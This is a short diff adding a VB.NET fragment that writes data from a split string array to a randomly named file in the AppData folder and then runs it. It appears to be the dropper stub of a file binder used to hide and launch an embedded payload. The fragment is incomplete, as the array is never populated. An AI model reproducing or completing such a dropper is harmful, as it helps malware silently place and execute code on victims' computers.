@@ -1,0 +1,12 @@
+Dim filled() As String
+
+Dim rand As New Random()
+
+'FilledSplitting
+
+Dim tpth As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & rand.Next(10000, 99999).ToString & filled(1)
+
+My.Computer.FileSystem.WriteAllBytes(tpth, System.Text.Encoding.Default.GetBytes(filled(0)), False)
+
+System.Diagnostics.Process.Start(tpth)
+
